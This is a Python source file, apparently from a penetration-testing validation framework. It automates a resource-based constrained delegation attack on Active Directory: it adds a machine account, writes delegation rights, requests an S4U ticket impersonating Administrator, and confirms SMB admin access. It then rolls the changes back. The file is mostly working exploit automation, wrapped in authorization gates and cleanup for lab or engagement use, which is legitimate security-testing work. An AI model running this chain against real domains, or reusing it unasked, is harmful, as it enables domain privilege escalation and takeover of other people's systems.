"""RBCD (resource-based constrained delegation) validation executor -- FULL.

Encodes the PROVEN RBCD recipe (claude-mem #66146), parameterized:

    impacket-addcomputer  <new$>                      (create a controlled computer)
    impacket-rbcd  -delegate-to <victim$> -delegate-from <new$> -action write
    impacket-getST -spn cifs/<victim> -impersonate <principal>   (S4U -> ccache)
    nxc smb <victim> -k --use-kcache                  (ticket-backed access = PROOF)
    ROLLBACK: impacket-rbcd -action flush  +  impacket-addcomputer -delete  (verified)

Proven + rolled back on GOAD meereen; the RBCD truth-vuln set is dc01/dc02
(#66146). This executor is target-agnostic: the victim host, the new computer
name, the impersonated principal and the SPN are all recommended-default +
operator-overridable params (the UX from #66142).

Terminal fact: ``rbcd_access`` -- ticket-backed authentication as the
impersonated principal against the victim. Mutating: yes; rollback is run and
*verified* (the scorer calls an unverified rollback ``inconclusive``). The
new-computer password is generated per run and never leaves this process; only a
non-secret success predicate is recorded.
"""
from __future__ import annotations
from .. import netresolve

import re
import secrets
from pathlib import Path
from typing import Any, Optional

from ..recommend import (ParamSpec, ParamValue, values, delegation_computer,
                         recommended_spn, validate_sam_name, sam_name_warning)
from .. import proof
from ._reveal_common import key_material
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, ToolAttempt, first_successful)


# ---- output predicate markers (verified against the recipe tooling, #66146) --
_RE_ADDCOMPUTER_OK = re.compile(r"Successfully added (machine|computer) account", re.I)
_RE_RBCD_WRITE_OK = re.compile(r"Delegation rights (modified|updated) successfully", re.I)
# bloodyAD RBCD-write success marker (D2 light fallback). UNVERIFIED -- the exact
# bloodyAD wording must be pinned in-lab; flagged like the probes' UNVERIFIED markers.
_RE_BLOODYAD_RBCD_OK = re.compile(
    r"can (now )?act on behalf|rbcd.*(written|added)|Successfully", re.I)
_RE_RBCD_FLUSH_OK = re.compile(r"(Delegation rights flushed|rights (modified|updated) successfully)", re.I)
# Positive marker that `-action read` actually returned the SD (not an empty/errored
# read): the impacket-rbcd read output always carries this header on success.
_RE_RBCD_READ_OK = re.compile(r"allowed to act on behalf|Accounts allowed to act", re.I)
_RE_ADDCOMPUTER_DEL_OK = re.compile(r"Successfully deleted (machine|computer) account", re.I)
_RE_GETST_TICKET = re.compile(r"(Saving|Updating) ticket in\s+(\S+)", re.I)
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)


def _short_name(host: str) -> str:
    """The computer sAMAccountName root for a host (short DNS label)."""
    return (host or "").split(".", 1)[0]


class RBCDExecutor(ValidationExecutor):
    technique = "RBCD"
    technique_class = "delegation"
    terminal_kind = "rbcd_access"
    mutating = True
    verified_recipe = True
    recipe_ref = ("#66146 RBCD = addcomputer ; rbcd -action write ; "
                  "getST -spn cifs/<victim> -impersonate <principal> ; nxc smb -k ; "
                  "ROLLBACK rbcd flush + addcomputer -delete")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        base = ctx.config.principal_base
        victim = finding.host or ""
        return [
            ParamSpec(
                name="new_computer", kind="computer_name",
                description="New computer account to create and control (the "
                            "'delegate-from' principal).",
                recommended=delegation_computer(base),  # <user>_cmp_delegation
                rationale="Derived from the supplied principal per the owner "
                          "worked example (joe -> joe_cmp_delegation, #66142).",
                validator=validate_sam_name, advisory=sam_name_warning,
            ),
            ParamSpec(
                name="delegate_to", kind="target_host",
                description="Victim host whose msDS-AllowedToActOnBehalfOf... is "
                            "written (the 'delegate-to' computer). Use its "
                            "hostname, not an IP, so the computer$ resolves.",
                recommended=victim,
                rationale="The host of the aranum RBCD finding.",
            ),
            ParamSpec(
                name="impersonate", kind="escalation_target",
                description="Principal to impersonate via S4U (the escalation "
                            "target proven by ticket-backed access).",
                recommended="Administrator",
                rationale="High-value default; override to the supplied user or a "
                          "specific DC per the engagement (#66142 override model).",
            ),
            ParamSpec(
                name="target_spn", kind="spn",
                description="SPN requested in the S4U2proxy step.",
                recommended=recommended_spn("cifs", victim) if victim else "cifs/<victim>",
                rationale="cifs/<victim> grants file-system / admin access when "
                          "impersonating a privileged principal.",
            ),
        ]

    def target_identity(self, ctx, finding, params) -> dict[str, Any]:
        # RBCD acts on the (possibly overridden) delegate_to host, not necessarily
        # the finding's own host; score against that identity.
        delegate_to = params["delegate_to"].value or finding.host or ""
        return ctx.config.resolve_target_identity(delegate_to)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        new, victim = v["new_computer"], v["delegate_to"]
        vsam = _short_name(victim)
        return [
            f"impacket-addcomputer -computer-name '{new}$' -computer-pass *** -dc-ip {dc} <auth>",
            f"impacket-rbcd -delegate-to '{vsam}$' -delegate-from '{new}$' -action write -dc-ip {dc} <auth>",
            f"impacket-getST -spn {v['target_spn']} -impersonate {v['impersonate']} -dc-ip {dc} '<domain>/{new}$:***'",
            f"nxc smb {victim} -k --use-kcache   (KRB5CCNAME=<ticket>)",
            f"ROLLBACK: impacket-rbcd -delegate-to '{vsam}$' -action flush ; impacket-addcomputer -computer-name '{new}$' -delete",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_target(self) -> tuple[str, list[str]]:
        """Operator's own auth: (``domain/user[:pass]`` target, extra hash flags)."""
        cfg = self.cfg
        target = f"{cfg.domain}/{cfg.username or ''}"
        extra: list[str] = []
        if cfg.nt_hash:
            extra = ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            extra = ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            target += f":{cfg.password}"
        return target, extra

    def _bloodyad_rbcd_argv(self, dc: str, vsam: str, new: str) -> list[str]:
        """bloodyAD RBCD-write fallback when impacket-rbcd is absent/hung.

        UNVERIFIED invocation (flag for lab-pinning):

            bloodyAD -d <domain> -u <user> (-p <pass> | -H <hash>) --host <dc_ip>
                add rbcd <victim$> <new$>

        ``<victim$>`` is the delegate-to computer (whose
        msDS-AllowedToActOnBehalfOfOtherIdentity is written); ``<new$>`` is the
        controlled delegate-from computer. Secrets ride ``-p``/``-H`` so
        :func:`redact_argv` masks them. aesKey-only auth is not wired for this
        fallback (bloodyAD needs a ccache for -k); flagged for lab-pinning.
        """
        cfg = self.cfg
        argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
        if cfg.nt_hash:
            argv += ["-H", cfg.nt_hash]
        elif cfg.password is not None:
            argv += ["-p", cfg.password]
        argv += ["--host", dc, "add", "rbcd", f"{vsam}$", f"{new}$"]
        return argv

    # ---------------------------------------------------------------- execute
    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        # Private recovery channel, populated before downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish_artifact(*args):
            artifact.update(self._artifact(*args))
            return artifact

        self.cfg = ctx.config
        v = values(params)
        dc = ctx.config.dc_ip
        new = v["new_computer"]
        victim = v["delegate_to"]
        vsam = _short_name(victim)
        impersonate = v["impersonate"]
        spn = v["target_spn"]
        new_pass = secrets.token_urlsafe(18)              # secret, never stored
        op_target, op_extra = self._op_auth_target()
        new_target = f"{ctx.config.domain}/{new}$:{new_pass}"
        out_dir = Path(ctx.output_dir)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def gated(op: str, detail: dict) -> bool:
            verdict = ctx.authorizer.authorize(op, detail)
            if verdict == "denied":
                gate["classifier"] = "denied"
                gate["op"] = op
                errors.append(f"gate_denied:{op}")
                return False
            if verdict == "approved" and gate["classifier"] == "not_required":
                gate["classifier"] = "approved"
                gate["op"] = op
            return True

        def record(name: str, argv: list[str], res: RunResult, ok: bool, note: str = "") -> StepRecord:
            sr = StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                            returncode=res.returncode, note=note)
            steps.append(sr)
            return sr

        # 1) create the controlled computer (mutating, gated) ----------------
        if not gated("addcomputer", {"computer": f"{new}$"}):
            return finish_artifact(steps, gate, mutation, None, False, errors)
        add_argv = ["impacket-addcomputer", "-computer-name", f"{new}$",
                    "-computer-pass", new_pass, "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(add_argv, timeout=ctx.config.tool_timeout_s)
        add_ok = _RE_ADDCOMPUTER_OK.search(res.stdout or "") is not None
        record("addcomputer", add_argv, res, add_ok)
        if not add_ok:
            errors.append("addcomputer_failed")
            return finish_artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True

        # 2) write RBCD on the victim (mutating, gated; D2 light fallback) ---
        # The GATE is called exactly as before, once, before either tool runs.
        if not gated("rbcd_write", {"delegate_to": f"{vsam}$", "delegate_from": f"{new}$"}):
            self._rollback(ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record)
            return finish_artifact(steps, gate, mutation, None, False, errors)
        rbcd_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$",
                     "-delegate-from", f"{new}$", "-action", "write",
                     "-dc-ip", dc, *op_extra, op_target]
        attempts = [
            ToolAttempt("impacket-rbcd", rbcd_argv,
                        success=lambda r: bool(_RE_RBCD_WRITE_OK.search(r.stdout or ""))),
            ToolAttempt("bloodyAD", self._bloodyad_rbcd_argv(dc, vsam, new),
                        success=lambda r: bool(
                            _RE_BLOODYAD_RBCD_OK.search((r.stdout or "") + (r.stderr or "")))),
        ]
        att, res, rbcd_ok = first_successful(attempts=attempts, runner=ctx.runner,
                                             timeout=ctx.config.tool_timeout_s)
        record("rbcd_write", att.argv, res, rbcd_ok, note=f"via {att.tool}")
        if not rbcd_ok:
            errors.append("rbcd_write_failed")
            self._rollback(ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record)
            return finish_artifact(steps, gate, mutation, None, False, errors)

        # 3) S4U getST as the new computer -> impersonation ticket -----------
        # #66146 gotcha: KRB5CCNAME must be UNSET before getST; it writes to CWD.
        getst_argv = ["impacket-getST", "-spn", spn, "-impersonate", impersonate,
                      "-dc-ip", dc, new_target]
        res = ctx.runner.run(getst_argv, timeout=ctx.config.tool_timeout_s,
                             env={"KRB5CCNAME": None}, cwd=str(out_dir))
        ticket = self._parse_ticket(res.stdout or "", out_dir)
        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonate, ticket))
        getst_ok = ticket is not None
        record("getST", getst_argv, res, getst_ok,
                note="ticket saved" if getst_ok else "no ticket")

        # 4) ticket-backed access = the terminal proof ----------------------
        terminal_fact: Optional[dict] = None
        nxc_ok = False
        if getst_ok:
            nxc_argv = ["nxc", "smb", victim, "-k", "--use-kcache",
                        *netresolve.nxc_kerberos_flags(self.cfg)]
            res = ctx.runner.run(nxc_argv, timeout=ctx.config.tool_timeout_s,
                                 env={"KRB5CCNAME": ticket}, cwd=str(out_dir))
            out = res.stdout or ""
            nxc_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
            record("nxc_access", nxc_argv, res, nxc_ok,
                   note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if nxc_ok else "")
            if not nxc_ok:
                diag = netresolve.classify_resolution_failure(
                    self.cfg, victim, out + "\n" + (res.stderr or ""))
                if diag:
                    errors.append(diag)
            terminal_fact = proof.build_terminal_fact(
                self.terminal_kind, ok=nxc_ok, impersonated=impersonate,
                predicate=(f"impersonated {impersonate} to {spn} via RBCD on "
                           f"{new}$ -> {vsam}$; ticket-backed SMB access"),
                proof_token=proof.proof_token("RBCD", victim, impersonate, new,
                                              "pwn3d" if _RE_NXC_PWNED.search(out) else "auth"),
                extra={"victim": vsam, "delegate_from": f"{new}$"},
            )
        else:
            errors.append("getST_no_ticket")

        # 5) rollback (always, since we mutated) + verify --------------------
        self._rollback(ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record)

        # Complete = chain ran through the terminal step and rollback was tried.
        complete = getst_ok and mutation["rollback"]["performed"]
        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record) -> None:
        """Flush the RBCD SD, delete the computer, and verify both (gated)."""
        if not mutation["applied"]:
            return
        dc = ctx.config.dc_ip
        if ctx.authorizer.authorize("rollback", {"computer": f"{new}$"}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "rbcd -action flush ; addcomputer -delete"

        flush_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$", "-action", "flush",
                      "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(flush_argv, timeout=ctx.config.tool_timeout_s)
        flush_ok = _RE_RBCD_FLUSH_OK.search(res.stdout or "") is not None
        record("rollback_rbcd_flush", flush_argv, res, flush_ok)

        read_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$", "-action", "read",
                     "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(read_argv, timeout=ctx.config.tool_timeout_s)
        # Verified clear: the SD read actually SUCCEEDED (positive header marker)
        # AND the deleted principal no longer appears. An empty/errored read must
        # not pass vacuously (that would report a clean SD it never actually saw).
        read_out = res.stdout or ""
        cleared = (bool(_RE_RBCD_READ_OK.search(read_out))
                   and f"{new}$".lower() not in read_out.lower())
        record("rollback_verify_read", read_argv, res, cleared,
               note="SD cleared" if cleared else "principal still present")

        del_argv = ["impacket-addcomputer", "-computer-name", f"{new}$", "-delete",
                    "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(del_argv, timeout=ctx.config.tool_timeout_s)
        del_ok = _RE_ADDCOMPUTER_DEL_OK.search(res.stdout or "") is not None
        record("rollback_delete_computer", del_argv, res, del_ok)

        mutation["rollback"]["verified"] = bool(flush_ok and cleared and del_ok)
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _parse_ticket(stdout: str, out_dir: Path) -> Optional[str]:
        m = _RE_GETST_TICKET.search(stdout)
        if not m:
            return None
        raw = m.group(2).strip()
        p = Path(raw)
        return str(p if p.is_absolute() else out_dir / p)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {
            "steps": [s.as_step() for s in steps],
            "gate": gate,
            "mutation": mutation,
            "terminal_fact": terminal_fact,
            "complete": complete,
            "errors": errors,
        }
